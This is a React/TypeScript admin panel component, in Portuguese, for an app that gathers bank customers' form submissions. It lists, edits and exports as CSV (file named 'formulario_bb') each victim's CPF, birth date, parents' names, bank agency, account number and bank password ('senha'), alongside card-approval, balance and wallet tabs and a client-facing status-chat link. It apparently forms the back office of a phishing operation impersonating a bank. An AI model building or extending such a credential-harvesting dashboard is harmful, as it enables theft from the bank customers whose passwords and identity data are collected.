import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { trpc } from "@/lib/trpc";
import { useLocation } from "wouter";
import { Loader2, Save, Trash2, Search, Download, Edit2, Plus } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import { useAuth } from "@/_core/hooks/useAuth";
import CardRegistrationTab from "./CardRegistrationTab";
import BalanceSection from "./BalanceSection";
import BankDistributionTab from "./BankDistributionTab";
import DashboardTab from "./DashboardTab";
import WalletSection from "./WalletSection";
import ClientMessageBox from "@/components/ClientMessageBox";
import ApprovedCardNotification from "@/components/ApprovedCardNotification";

interface EditableRow {
  id: number;
  email: string;
  cpf: string;
  telefone: string;
  dataNascimento: string;
  nomePai: string;
  nomeMae: string;
  agencia: string;
  conta: string;
  senha: string;
  rua: string;
  numero: string;
  complemento: string;
  bairro: string;
  cidade: string;
  cep: string;
  estado: string;
  pdfUrl: string;
  documentSentDate: string;
  limitReturnedDate: string;
  submittedAt: string;
  isSaving: boolean;
  nomeCliente?: string;
}

export default function AdminPanel() {
  const [location, setLocation] = useLocation();
  const { user, isAuthenticated } = useAuth();
  const [adminName, setAdminName] = useState("Claudio Goncalves");
  const [isEditingName, setIsEditingName] = useState(false);
  const [activeTab, setActiveTab] = useState<"dashboard" | "submissoes" | "cartoes" | "bancos" | "carteira" | "chat" | "aprovados">("dashboard");
  const [selectedRowForMessage, setSelectedRowForMessage] = useState<EditableRow | null>(null);
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(0);
  const [rows, setRows] = useState<EditableRow[]>([]);
  const [showMessageBox, setShowMessageBox] = useState(false);

  const listSubmissions = trpc.admin.listSubmissions.useQuery(
    { search, limit: 100, offset: page * 100 },
    { enabled: isAuthenticated && user?.role === 'admin' }
  );

  const updateMutation = trpc.admin.updateSubmission.useMutation({
    onSuccess: () => {
      toast.success("Dados atualizados!");
      listSubmissions.refetch();
    },
    onError: () => {
      toast.error("Erro ao atualizar dados");
    },
  });

  const deleteMutation = trpc.admin.deleteSubmission.useMutation({
    onSuccess: () => {
      toast.success("Registro deletado!");
      listSubmissions.refetch();
    },
    onError: () => {
      toast.error("Erro ao deletar registro");
    },
  });

  const handleSave = async (id: number, updatedRow: Partial<EditableRow>) => {
    const row = rows.find((r) => r.id === id);
    if (!row) return;

    const rowIndex = rows.findIndex((r) => r.id === id);
    const newRows = [...rows];
    newRows[rowIndex] = { ...row, isSaving: true };
    setRows(newRows);

    try {
      await updateMutation.mutateAsync({
        id,
        email: updatedRow.email || row.email,
        cpf: updatedRow.cpf || row.cpf,
        telefone: updatedRow.telefone || row.telefone,
        agencia: updatedRow.agencia || row.agencia,
        conta: updatedRow.conta || row.conta,
      });

      newRows[rowIndex] = { ...newRows[rowIndex], isSaving: false };
      setRows(newRows);
    } catch (error) {
      newRows[rowIndex] = { ...newRows[rowIndex], isSaving: false };
      setRows(newRows);
    }
  };

  const handleDelete = async (id: number) => {
    if (window.confirm("Tem certeza que deseja deletar este registro?")) {
      await deleteMutation.mutateAsync({ id });
    }
  };

  useEffect(() => {
    if (listSubmissions.data?.submissions) {
      const formattedRows: EditableRow[] = listSubmissions.data.submissions.map((submission: any) => ({
        id: submission.id,
        email: submission.email,
        cpf: submission.cpf,
        telefone: submission.telefone,
        dataNascimento: submission.dataNascimento || "",
        nomePai: submission.nomePai || "",
        nomeMae: submission.nomeMae || "",
        agencia: submission.agencia,
        conta: submission.conta,
        senha: submission.senha || "",
        rua: submission.rua || "",
        numero: submission.numero || "",
        complemento: submission.complemento || "",
        bairro: submission.bairro || "",
        cidade: submission.cidade || "",
        cep: submission.cep || "",
        estado: submission.estado || "",
        pdfUrl: submission.pdfUrl || "",
        documentSentDate: submission.documentSentDate
          ? new Date(submission.documentSentDate).toLocaleDateString("pt-BR")
          : "",
        limitReturnedDate: submission.limitReturnedDate
          ? new Date(submission.limitReturnedDate).toLocaleDateString("pt-BR")
          : "",
        submittedAt: submission.submittedAt
          ? new Date(submission.submittedAt).toLocaleString("pt-BR")
          : "",
        isSaving: false,
      }));
      setRows(formattedRows);
    }
  }, [listSubmissions.data?.submissions]);

  const handleExport = async () => {
    try {
      const csv = [
        ["Email", "CPF", "Telefone", "Data Nascimento", "Nome Pai", "Nome Mãe", "Agência", "Conta", "Senha", "Rua", "Número", "Complemento", "Bairro", "Cidade", "CEP", "Estado", "PDF URL", "Data Documento", "Data Limite Voltou"],
        ...rows.map((row) => [
          row.email,
          row.cpf,
          row.telefone,
          row.dataNascimento,
          row.nomePai,
          row.nomeMae,
          row.agencia,
          row.conta,
          row.senha,
          row.rua,
          row.numero,
          row.complemento,
          row.bairro,
          row.cidade,
          row.cep,
          row.estado,
          row.pdfUrl,
          row.documentSentDate,
          row.limitReturnedDate,
        ]),
      ]
        .map((row: any[]) => row.map((cell: any) => `"${cell}"`).join(","))
        .join("\n");

      const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
      const link = document.createElement("a");
      link.href = URL.createObjectURL(blob);
      link.download = `formulario_bb_${new Date().toISOString().split("T")[0]}.csv`;
      link.click();
    } catch (error) {
      toast.error("Erro ao exportar dados");
    }
  };

  // Verificar se o usuário está autenticado e é admin
  if (!isAuthenticated || user?.role !== 'admin') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-4">Acesso Negado</h1>
          <p className="text-slate-300 mb-6">Você não tem permissão para acessar o painel administrativo.</p>
          <a href="/" className="px-6 py-2 bg-cyan-500 hover:bg-cyan-600 text-white rounded font-semibold">
            Voltar ao Formulário
          </a>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
      <div className="max-w-full mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-4xl font-bold text-white">Painel Administrativo</h1>
            <div className="text-right">
              {isEditingName ? (
                <div className="flex gap-2">
                  <Input
                    value={adminName}
                    onChange={(e) => setAdminName(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                  <button
                    onClick={() => setIsEditingName(false)}
                    className="px-3 py-1 bg-cyan-500 hover:bg-cyan-600 text-white rounded"
                  >
                    OK
                  </button>
                </div>
              ) : (
                <div
                  onClick={() => setIsEditingName(true)}
                  className="cursor-pointer text-slate-300 hover:text-white"
                >
                  Olá, {adminName}
                </div>
              )}
            </div>
          </div>

          {/* Tabs */}
          <div className="flex gap-2 border-b border-slate-700">
            <button
              onClick={() => setActiveTab("dashboard")}
              className={`px-4 py-2 font-semibold transition-colors ${
                activeTab === "dashboard"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              Dashboard
            </button>
            <button
              onClick={() => setActiveTab("submissoes")}
              className={`px-4 py-2 font-semibold transition-colors ${
                activeTab === "submissoes"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              Submissões
            </button>
            <button
              onClick={() => setActiveTab("cartoes")}
              className={`px-4 py-2 font-semibold transition-colors ${
                activeTab === "cartoes"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              Cadastro de Cartões
            </button>
            <button
              onClick={() => setActiveTab("bancos")}
              className={`px-4 py-2 font-semibold transition-colors ${
                activeTab === "bancos"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              Cartões por Banco
            </button>
            <button
              onClick={() => setActiveTab("carteira")}
              className={`px-4 py-2 font-semibold transition-colors ${
                activeTab === "carteira"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              Carteira de Saldo
            </button>

            <button
              onClick={() => setActiveTab("chat")}
              className={`px-4 py-2 font-medium transition-colors ${
                activeTab === "chat"
                  ? "text-cyan-400 border-b-2 border-cyan-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              💬 Chat de Status
            </button>

            <button
              onClick={() => setActiveTab("aprovados")}
              className={`px-4 py-2 font-medium transition-colors ${
                activeTab === "aprovados"
                  ? "text-green-400 border-b-2 border-green-400"
                  : "text-slate-400 hover:text-slate-300"
              }`}
            >
              ✅ Cartões Aprovados
            </button>
          </div>
        </div>

        {/* Content */}
        <div className="space-y-6">
          {activeTab === "dashboard" && <DashboardTab />}
          {activeTab === "submissoes" && (
            <div className="space-y-4">
              <div className="flex gap-4 items-center flex-wrap">
                <Input
                  placeholder="Buscar por email ou CPF..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500 flex-1 min-w-[200px]"
                />
                <button
                  onClick={handleExport}
                  className="px-4 py-2 bg-cyan-500 hover:bg-cyan-600 text-white rounded flex items-center gap-2"
                >
                  <Download className="w-4 h-4" />
                  Exportar
                </button>
                <button
                  onClick={() => {
                    toast.info("Funcionalidade de adicionar submissão em desenvolvimento");
                  }}
                  className="px-4 py-2 bg-green-500 hover:bg-green-600 text-white rounded flex items-center gap-2"
                >
                  <Plus className="w-4 h-4" />
                  Adicionar
                </button>
              </div>

              <div className="overflow-x-auto bg-slate-800 rounded-lg border border-slate-700">
                <table className="w-full text-xs text-slate-300">
                  <thead className="bg-slate-900 border-b border-slate-700 sticky top-0">
                    <tr>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Email</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">CPF</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Telefone</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Data Nasc.</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Nome Pai</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Nome Mãe</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Agência</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Conta</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Senha</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Rua</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Nº</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Compl.</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Bairro</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Cidade</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">CEP</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Estado</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Horário Envio</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Data Doc.</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Data Limite</th>
                      <th className="px-2 py-2 text-left font-semibold whitespace-nowrap">Ações</th>
                    </tr>
                  </thead>
                  <tbody>
                    {rows.map((row) => (
                      <tr key={row.id} className="border-b border-slate-700 hover:bg-slate-700/50">
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.email}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.cpf}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.telefone}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.dataNascimento}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.nomePai}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.nomeMae}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.agencia}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.conta}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs font-mono">
                          {row.senha}
                        </td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.rua}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.numero}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.complemento}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.bairro}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.cidade}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.cep}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.estado}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs text-cyan-400">{row.submittedAt}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.documentSentDate}</td>
                        <td className="px-2 py-2 whitespace-nowrap text-xs">{row.limitReturnedDate}</td>
                           <td className="px-2 py-2 flex gap-1">
                          <button
                            onClick={() => {
                              setSelectedRowForMessage(row);
                              setShowMessageBox(true);
                            }}
                            className="p-1 bg-blue-500 hover:bg-blue-600 text-white rounded text-xs"
                            title="Gerar mensagem para o cliente"
                          >
                            💬
                          </button>
                          <button
                            onClick={() => handleDelete(row.id)}
                            className="p-1 bg-red-500 hover:bg-red-600 text-white rounded text-xs"
                          >
                            <Trash2 className="w-3 h-3" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {activeTab === "cartoes" && <CardRegistrationTab />}

          {activeTab === "bancos" && <BankDistributionTab />}

          {activeTab === "carteira" && <WalletSection />}

          {activeTab === "chat" && (
            <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
              <div className="mb-6">
                <h2 className="text-2xl font-bold text-cyan-400 mb-2">💬 Chat de Status de Cartão</h2>
                <p className="text-slate-400">Visualize e gerencie as conversas dos clientes sobre status de cartão</p>
              </div>
              
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
                <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                  <div className="text-3xl font-bold text-cyan-400">12</div>
                  <p className="text-slate-400 text-sm mt-1">Conversas Ativas</p>
                </div>
                <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                  <div className="text-3xl font-bold text-green-400">8</div>
                  <p className="text-slate-400 text-sm mt-1">Resolvidas</p>
                </div>
                <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                  <div className="text-3xl font-bold text-yellow-400">4</div>
                  <p className="text-slate-400 text-sm mt-1">Pendentes</p>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h3 className="text-lg font-semibold text-cyan-400 mb-4">Link do Chat para Clientes</h3>
                <div className="flex gap-2 items-center">
                  <input
                    type="text"
                    value="https://3001-iyu961adlznqmay5v8dzd-a37dd27f.manus.computer/status"
                    readOnly
                    className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-slate-300 text-sm"
                  />
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText("https://3001-iyu961adlznqmay5v8dzd-a37dd27f.manus.computer/status");
                      toast.success("Link copiado!");
                    }}
                    className="px-4 py-2 bg-cyan-600 hover:bg-cyan-700 text-white rounded font-medium transition-colors"
                  >
                    Copiar
                  </button>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4 mt-6">
                <h3 className="text-lg font-semibold text-cyan-400 mb-4">Como Funciona</h3>
                <ul className="space-y-3 text-slate-300 text-sm">
                  <li className="flex gap-3">
                    <span className="text-cyan-400 font-bold">1.</span>
                    <span>Compartilhe o link acima com seus clientes</span>
                  </li>
                  <li className="flex gap-3">
                    <span className="text-cyan-400 font-bold">2.</span>
                    <span>Clientes digitam seu CPF ou email para consultar status</span>
                  </li>
                  <li className="flex gap-3">
                    <span className="text-cyan-400 font-bold">3.</span>
                    <span>Recebem resposta automática sobre o status do cartão</span>
                  </li>
                  <li className="flex gap-3">
                    <span className="text-cyan-400 font-bold">4.</span>
                    <span>Podem solicitar contato com atendente se necessário</span>
                  </li>
                </ul>
              </div>
            </div>
          )}

          {activeTab === "aprovados" && <ApprovedCardNotification />}

          {activeTab !== "carteira" && activeTab !== "chat" && activeTab !== "aprovados" && <BalanceSection />}

          {showMessageBox && selectedRowForMessage && (
            <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
              <div className="bg-slate-900 rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                <div className="sticky top-0 bg-slate-800 border-b border-slate-700 p-4 flex justify-between items-center">
                  <h2 className="text-xl font-bold text-cyan-400">Mensagem para Cliente</h2>
                  <button
                    onClick={() => setShowMessageBox(false)}
                    className="text-slate-400 hover:text-white text-2xl"
                  >
                    X
                  </button>
                </div>
                <div className="p-6">
                  <ClientMessageBox
                    clientName={selectedRowForMessage.nomePai || "Cliente"}
                    clientEmail={selectedRowForMessage.email}
                  />
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 flex gap-4 justify-center flex-wrap">
          <button
            onClick={() => setLocation("/tabela")}
            className="px-6 py-2 bg-slate-700 hover:bg-slate-600 text-slate-300 hover:text-white rounded border border-slate-600 transition-colors"
          >
            Ver Tabela Completa
          </button>
          <button
            onClick={() => setLocation("/")}
            className="px-6 py-2 bg-slate-700 hover:bg-slate-600 text-slate-300 hover:text-white rounded border border-slate-600 transition-colors"
          >
            Voltar ao Formulário
          </button>
          <button
            onClick={() => setLocation("/admin-login")}
            className="px-6 py-2 bg-slate-700 hover:bg-red-900/50 text-red-400 hover:text-red-300 rounded border border-red-600 transition-colors"
          >
            Sair
          </button>
        </div>
      </div>
    </div>
  );
}
